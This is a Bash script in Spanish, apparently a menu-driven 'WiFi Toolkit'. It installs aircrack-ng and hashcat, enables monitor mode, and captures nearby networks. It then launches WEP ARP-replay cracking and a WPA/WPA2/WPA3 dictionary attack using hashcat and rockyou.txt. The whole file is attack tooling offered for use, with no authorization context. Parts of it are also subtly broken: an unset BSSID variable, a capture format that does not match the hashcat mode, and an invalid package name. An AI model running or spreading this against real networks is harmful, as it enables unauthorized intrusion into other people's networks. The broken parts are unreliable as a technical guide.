#!/bin/bash

# ==========================================================
# WiFi Toolkit - Soporte para WPA, WPA2, WPA3, WEP y abiertas
# ==========================================================

# Colores para mensajes
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Configuración global
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "aireplay-ng" "packetforge-ng")

# ==========================================================
# Funciones
# ==========================================================

# Verificar permisos de administrador
check_permissions() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Este script debe ejecutarse como administrador. Usa 'sudo'.${NC}"
        exit 1
    fi
}

# Crear carpetas de proyecto
prepare_project_directory() {
    for dir in "$PROJECT_DIR" "$RESULTS_DIR"; do
        if [[ ! -d "$dir" ]]; then
            mkdir -p "$dir" || { echo -e "${RED}Error al crear la carpeta $dir.${NC}"; exit 1; }
        fi
    done
}

# Verificar e instalar dependencias
install_dependencies() {
    echo -e "${BLUE}Verificando dependencias...${NC}"
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v $dep &>/dev/null; then
            echo -e "${YELLOW}Instalando $dep...${NC}"
            apt-get install -y $dep &>/dev/null || {
                echo -e "${RED}Error al instalar $dep.${NC}"
                exit 1
            }
        fi
    done
    echo -e "${GREEN}Todas las dependencias están instaladas.${NC}"
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
    if [[ -z "$interface" ]]; then
        echo -e "${RED}No se encontró ninguna interfaz inalámbrica.${NC}"
        exit 1
    fi
    echo "$interface"
}

# Activar modo monitor
enable_monitor_mode() {
    interface=$(detect_wireless_interface)
    echo -e "${BLUE}Activando modo monitor en $interface...${NC}"
    airmon-ng start $interface &>/dev/null || iw dev $interface set type monitor &>/dev/null
    echo -e "${GREEN}Modo monitor activado en $interface.${NC}"
}

# Escanear redes
scan_networks() {
    interface=$(detect_wireless_interface)
    echo -e "${BLUE}Escaneando redes durante 60 segundos...${NC}"
    xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/scan_results" &
    sleep 60
    killall airodump-ng
    echo -e "${GREEN}Escaneo completado. Resultados guardados en $RESULTS_DIR.${NC}"
}

# Analizar redes escaneadas
analyze_networks() {
    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" | head -n 1)
    if [[ -z "$cap_file" ]]; then
        echo -e "${RED}No se encontró ningún archivo .cap.${NC}"
        return
    fi

    networks=$(aircrack-ng $cap_file | grep -E "WEP|WPA|Open" | awk '{print $3, $4, $5}')
    if [[ -z "$networks" ]]; then
        echo -e "${YELLOW}No se encontraron redes vulnerables.${NC}"
        return
    fi

    echo -e "${BLUE}Redes encontradas:${NC}"
    echo "$networks" | nl
}

# Ataque a redes WEP
attack_wep() {
    echo -e "${BLUE}Iniciando ataque WEP...${NC}"
    interface=$(detect_wireless_interface)
    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" | head -n 1)

    if [[ -z "$cap_file" ]]; then
        echo -e "${RED}No se encontró ningún archivo .cap.${NC}"
        return
    fi

    aireplay-ng --arpreplay -b $BSSID $interface &>/dev/null
    aircrack-ng -z $cap_file
    echo -e "${GREEN}Ataque WEP completado.${NC}"
}

# Ataque a redes abiertas
attack_open() {
    echo -e "${YELLOW}Las redes abiertas no requieren descifrado.${NC}"
    echo -e "${GREEN}Puedes conectarte directamente desde tu gestor de redes.${NC}"
}

# Ataque WPA/WPA2/WPA3
attack_wpa() {
    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" | head -n 1)
    dictionary=$(find / -type f -name "rockyou.txt" | head -n 1)

    if [[ -z "$cap_file" || -z "$dictionary" ]]; then
        echo -e "${RED}Faltan archivos necesarios para el ataque.${NC}"
        return
    fi

    echo -e "${BLUE}Iniciando ataque WPA/WPA2/WPA3...${NC}"
    hashcat -m 22000 $cap_file $dictionary
}

# Menú principal
main_menu() {
    while true; do
        echo -e "\n${BLUE}WiFi Toolkit - Menú principal${NC}"
        echo "1. Instalar dependencias"
        echo "2. Activar modo monitor"
        echo "3. Escanear redes"
        echo "4. Analizar redes"
        echo "5. Atacar redes WEP"
        echo "6. Atacar redes WPA/WPA2/WPA3"
        echo "7. Gestionar redes abiertas"
        echo "8. Salir"
        read -p "Selecciona una opción: " option

        case $option in
            1) install_dependencies ;;
            2) enable_monitor_mode ;;
            3) scan_networks ;;
            4) analyze_networks ;;
            5) attack_wep ;;
            6) attack_wpa ;;
            7) attack_open ;;
            8) echo -e "${GREEN}Saliendo...${NC}"; exit 0 ;;
            *) echo -e "${RED}Opción inválida.${NC}" ;;
        esac
    done
}

# ==========================================================
# Ejecución
# ==========================================================
check_permissions
prepare_project_directory
main_menu
